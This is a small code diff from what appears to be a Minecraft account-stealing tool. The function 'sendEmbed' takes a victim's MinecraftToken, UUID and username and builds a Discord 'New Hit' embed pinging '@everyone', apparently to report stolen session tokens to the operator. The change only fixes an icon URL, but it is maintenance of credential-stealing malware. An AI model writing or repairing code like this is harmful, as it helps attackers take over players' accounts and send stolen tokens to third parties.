@@ -170,7 +170,7 @@ async function sendEmbed(MinecraftToken, uuid, username) {
 	});
 	const embed = new EmbedBuilder()
 		.setTitle(`**New Hit ❗**`)
-		.setAuthor({ name: 'Xenon', iconURL: 'i.imgur.com/zocp3XL.png'})
+		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/zocp3XL.png'})
 		.setDescription('@everyone')
 		.setColor(0x0099FF)
 		.addFields(
